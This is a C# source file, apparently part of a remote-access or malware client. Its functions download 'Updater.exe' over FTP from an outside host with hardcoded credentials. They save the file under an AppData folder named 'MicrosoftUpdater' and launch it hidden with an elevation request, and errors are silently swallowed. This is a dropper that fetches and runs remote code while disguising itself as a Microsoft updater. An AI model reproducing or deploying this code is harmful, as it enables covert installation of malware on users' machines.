using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;


public class Functions
{
    public void DownloadUpdate()
    {
        GetUpd();
    }

    public void GetUpd()
    {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        DownloadF("Updater.exe", folderPath + "\\MicrosoftUpdater\\");
        RunHideProc(folderPath + "\\MicrosoftUpdater\\" + "Updater.exe");              
    }

    public void Disconnect()
    {
        Environment.Exit(0);
    }

    public void DownloadF(string FileName, string localPath)
    {

        string requestUriString = "ftp://" + "fokes1.asuscomm.com" + "/" + FileName;
        try
        {
            FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
            ftpWebRequest.Method = WebRequestMethods.Ftp.DownloadFile;
            ftpWebRequest.Credentials = new NetworkCredential("ff", "WorkerFF");

            FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
            FileStream fileStream = new FileStream(localPath + FileName, FileMode.Create);
            Stream responseStream = ftpWebResponse.GetResponseStream();
            byte[] array = new byte[2048];
            int count;
            while ((count = responseStream.Read(array, 0, array.Length)) > 0)
            {
                fileStream.Write(array, 0, count);
            }
            fileStream.Close();
            ftpWebResponse.Close();
        }
        catch (Exception ex)
        {
        }
    }
    public void RunHideProc(string fileName)
    {
        try
        {
            new Process
            {
                StartInfo =
                {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                }
            }.Start();
        }
        catch (Exception ex)
        {
        }
    }
}
